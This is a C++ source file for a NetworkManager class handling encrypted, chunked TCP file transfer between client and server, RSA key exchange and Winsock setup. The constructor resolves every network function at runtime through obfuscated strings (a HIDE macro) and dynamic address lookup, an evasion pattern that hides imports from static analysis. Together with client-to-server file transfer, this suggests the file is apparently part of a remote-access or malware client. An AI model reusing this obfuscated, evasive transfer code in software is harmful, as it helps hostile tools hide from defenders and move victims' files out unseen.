#include "NetworkManager.h"
#include "ProcessManager.h"
#include "ext/obfuscate.h"
#include "ext/base64.h"

#include <vector>
#include <fstream>

constexpr int packetBufferSize    = MAX_BUFFER_LEN / 2; // Comfortable buffer size, dont wanna fill it fully
constexpr int encryptedBufferSize = MAX_BUFFER_LEN + 48; // sze of an encrypted packet

bool NetworkManager::ReceiveFile(SOCKET s, BYTESTRING aesKey, std::string& output) {
    BYTESTRING totalEncrypted;
    if ( !ReceiveTCPLargeData(totalEncrypted, s) )
        return false;

    std::string fileContent;
    fileContent.reserve(totalEncrypted.size()); // approximate size
    int bytesRead = 0; // decrypted

    // split the message up, once split, decrypt the chunk to a packet, add buffer
    while ( bytesRead < totalEncrypted.size() ) {
        BYTESTRING encryptedChunk;

        if ( ( bytesRead + encryptedBufferSize ) >= totalEncrypted.size() )
            encryptedChunk.insert(encryptedChunk.begin(), totalEncrypted.begin() + bytesRead, totalEncrypted.end());
        else
            encryptedChunk.insert(encryptedChunk.begin(), totalEncrypted.begin() + bytesRead, totalEncrypted.begin() + (bytesRead + encryptedBufferSize) );

        Packet decryptedPacket = LGCrypto::DecryptToStruct<Packet>(encryptedChunk, aesKey);
        std::string buffer = decryptedPacket.buffer;
        std::string b64Decoded;
        b64Decoded.reserve(decryptedPacket.buffLen);
        macaron::Base64::Decode(buffer, b64Decoded);

        fileContent += b64Decoded;
        bytesRead += encryptedBufferSize; // go to the next chunk
    }
    
    output = fileContent;
    return true;
}

bool NetworkManager::SendFile(File& file, SOCKET s, BYTESTRING aesKey) {
    std::string contents         = file.ReadFrom();
    ULONG       fileSize         = file.GetFileSize();
    ULONG       readBytes        = 0; // out of 'toRead' how many bytes have been read from contents
    double      adjustedPacketSize = packetBufferSize * 3.0 / 4.0;
    int         packetsToSend    = std::ceil(file.GetFileSize() / (double)adjustedPacketSize ); /* Leave some room to be safe */ 
    int         packets          = 0; // packets sent
    BYTESTRING  totalEncrypted;

    // send meta data first
    Packet metadata;
    metadata.code = kNotAResponse;
    metadata.action = kReceiveFileFromClient;
    metadata.valid = true;
    metadata.insert(file.GetFilePath());

    if ( !SendTCPLargeData(LGCrypto::EncryptStruct(metadata, aesKey, LGCrypto::GenerateAESIV()), s) )
        return false;

    while ( readBytes < fileSize ) // while we still need to read
    {
        Packet toSend;
        int remainingBytes = fileSize - readBytes;
        
        if ( remainingBytes < adjustedPacketSize ) { // fit the rest in one packet buffer
            std::string remainder(contents.begin() + readBytes, contents.begin() + readBytes + remainingBytes);
            std::string encodedRemainder = macaron::Base64::Encode(remainder);

            toSend.insert(encodedRemainder);
            readBytes += remainder.size();
        } else {
            std::string chunk(contents.begin() + readBytes, contents.begin() + readBytes + adjustedPacketSize);
            std::string encodedChunk = macaron::Base64::Encode(chunk);

            toSend.insert(encodedChunk);
            readBytes += chunk.size();
        }

        packets++;

        BYTESTRING encrypted = LGCrypto::EncryptStruct<Packet>(toSend, aesKey, LGCrypto::GenerateAESIV());
        totalEncrypted.insert(totalEncrypted.end(), encrypted.begin(), encrypted.end());
    }

    if ( !SendTCPLargeData(totalEncrypted, s) )
        return false;
    
    return true;
}

bool NetworkManager::SendTCPLargeData(const BYTESTRING& message, SOCKET s) {
    if ( !IsTCPSocket(s) ) return false;

    int toSend = message.size();
    int bytesSent = 0;

    int sent = Send(s, ( char* ) &toSend, sizeof(toSend), 0);
    if ( sent <= 0 )
        return false;

    while ( bytesSent < toSend ) {
        sent = Send(s, ( char* ) message.data() + bytesSent, toSend - bytesSent, 0);

        if ( sent <= 0 )
            return false;

        bytesSent += sent;
    }
    return true;
}

bool NetworkManager::ReceiveTCPLargeData(BYTESTRING& data, SOCKET s)
{
    if ( !IsTCPSocket(s) ) return false;

    int toReceive = 0;
    BYTESTRING buffer;
    int bytesReceived = 0;

    int received = Receive(s, ( char* ) &toReceive, sizeof(toReceive), 0);

    if ( received <= 0 )
        return false;

    buffer.resize(toReceive);

    while ( bytesReceived < toReceive ) {
        received = Receive(s, ( char* ) buffer.data() + bytesReceived, toReceive - bytesReceived, 0);

        if ( received <= 0 )
            return false;

        bytesReceived += received;
    }
    data = buffer;
    return true;
}

bool NetworkManager::TransmitRSAKey(SOCKET s, RSA* key, bool isPrivateKey) {
    if ( !key )
        return false;

    DER format = LGCrypto::RSAKeyToDer(key, isPrivateKey);
    if ( Send(s, ( char* ) &format.len, sizeof(format.len), 0) <= 0 )
        return false;
    
    if ( Send(s, ( char* ) format.data, format.len, 0) <= 0 )
        return false;

    return true;
}

bool NetworkManager::IsTCPSocket(SOCKET s) {
    int type, optLen;
    optLen = sizeof(type);

    GetSocketOptions(s, SOL_SOCKET, SO_TYPE, ( char* ) &type, &optLen);
    if ( type == SOCK_STREAM )
        return true;

    return false;
}

NetworkManager::NetworkManager() {
    if ( this->m_WSAInitialized )
        return;

#ifdef SERVER_RELEASE
    if ( !DllsLoaded ) {
        Kernel32DLL = LoadLibraryA("kernel32.dll");
        NTDLL = LoadLibraryA("ntdll.dll");
        AdvApi32DLL = LoadLibraryA("advapi32.dll");
        DllsLoaded = true;
    }
#endif

    // load winsock and kernel32 libraries

    HMODULE WINSOCK = ProcessManager::GetFunctionAddress<_LoadLibrary>(Kernel32DLL, std::string(HIDE("LoadLibraryA")))( ( char* ) HIDE("Ws2_32.dll") );

    //// function pointers from winsock
    StartWSA = ProcessManager::GetFunctionAddress<_WSAStartup>(WINSOCK, std::string(HIDE("WSAStartup")));
    BindSocket = ProcessManager::GetFunctionAddress<_bind>(WINSOCK, std::string(HIDE("bind")));
    CloseSocket = ProcessManager::GetFunctionAddress<_closesocket>(WINSOCK, std::string(HIDE("closesocket")));
    CreateSocket = ProcessManager::GetFunctionAddress<_socket>(WINSOCK, std::string(HIDE("socket")));
    Receive = ProcessManager::GetFunctionAddress<_recv>(WINSOCK, std::string(HIDE("recv")));
    SendTo = ProcessManager::GetFunctionAddress<_sendto>(WINSOCK, std::string(HIDE("sendto")));
    ReceiveFrom = ProcessManager::GetFunctionAddress<_recvfrom>(WINSOCK, std::string(HIDE("recvfrom")));
    Send = ProcessManager::GetFunctionAddress<_send>(WINSOCK, std::string(HIDE("send")));
    CleanWSA = ProcessManager::GetFunctionAddress<_WSACleanup>(WINSOCK, std::string(HIDE("WSACleanup")));
    ConnectSocket = ProcessManager::GetFunctionAddress<_connect>(WINSOCK, std::string(HIDE("connect")));
    SocketListen = ProcessManager::GetFunctionAddress<_listen>(WINSOCK, std::string(HIDE("listen")));
    ShutdownSocket = ProcessManager::GetFunctionAddress<_shutdown>(WINSOCK, std::string(HIDE("shutdown")));
    AcceptOnSocket = ProcessManager::GetFunctionAddress<_accept>(WINSOCK, std::string(HIDE("accept")));
    HostToNetworkShort = ProcessManager::GetFunctionAddress<_htons>(WINSOCK, std::string(HIDE("htons")));
    InternetAddress = ProcessManager::GetFunctionAddress<_inet_addr>(WINSOCK, std::string(HIDE("inet_addr")));
    GetHostByName = ProcessManager::GetFunctionAddress<_gethostbyname>(WINSOCK, std::string(HIDE("gethostbyname")));
    HostToNetworkLong = ProcessManager::GetFunctionAddress<_htonl>(WINSOCK, std::string(HIDE("htonl")));
    NetworkToHostLong = ProcessManager::GetFunctionAddress<_ntohl>(WINSOCK, std::string(HIDE("ntohl")));
    SetSocketOptions = ProcessManager::GetFunctionAddress<_setsocketopt>(WINSOCK, std::string(HIDE("setsockopt")));
    GetSocketOptions = ProcessManager::GetFunctionAddress<_getsocketopt>(WINSOCK, std::string(HIDE("getsockopt")));

    WORD    version = MAKEWORD(2, 2);
    WSAData data = { 0 };

    if ( StartWSA(version, &data) == 0 ) {
        this->m_WSAInitialized = true;
    }
}

void NetworkManager::SetSocketTimeout(SOCKET s, int timeoutMS, int type) {
    SetSocketOptions(s, SOL_SOCKET, type, ( char* ) &timeoutMS, sizeof(timeoutMS));
}

void NetworkManager::ResetSocketTimeout(SOCKET s, int type) {
    SetSocketTimeout(s, 0, type);
}